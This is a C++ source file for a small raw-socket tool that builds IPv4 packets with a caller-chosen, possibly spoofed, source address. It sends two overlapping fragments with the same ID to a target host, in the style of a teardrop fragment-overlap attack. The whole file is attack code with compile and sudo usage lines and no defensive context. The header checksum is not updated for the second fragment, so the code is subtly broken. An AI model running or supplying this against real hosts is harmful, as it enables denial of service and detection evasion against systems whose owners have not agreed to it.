// ============================================================
// frag_overlap.cpp — overlapping IP fragments
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o frag_overlap frag_overlap.cpp
// Usage:   sudo ./frag_overlap <src_ip> <dst_ip>
// ============================================================
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>

static uint16_t csum(const void* d, int n) {
    const uint16_t* p = (const uint16_t*)d; uint32_t s = 0;
    while (n > 1) { s += *p++; n -= 2; }
    if (n) s += *(const uint8_t*)p;
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s;
}

int main(int argc, char** argv) {
    if (argc < 3) return 1;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    inet_pton(AF_INET, argv[2], &dst.sin_addr);

    char buf[128] = {0};
    auto* ip = (iphdr*)buf;
    ip->version = 4; ip->ihl = 5;
    ip->tot_len = htons(64);
    ip->id = htons(0x1234);
    ip->frag_off = htons(0x2000); // MF
    ip->ttl = 64; ip->protocol = IPPROTO_UDP;
    inet_pton(AF_INET, argv[1], &ip->saddr);
    ip->daddr = dst.sin_addr.s_addr;
    ip->check = csum(ip, sizeof(iphdr));

    // Fragment 1: offset 0, len 64
    sendto(s, buf, 64, 0, (sockaddr*)&dst, sizeof(dst));

    // Fragment 2: overlapping offset, len 64
    ip->frag_off = htons(0x2001); // MF + offset 1
    sendto(s, buf, 64, 0, (sockaddr*)&dst, sizeof(dst));

    std::printf("[+] overlapping fragments sent\n");
    return 0;
}
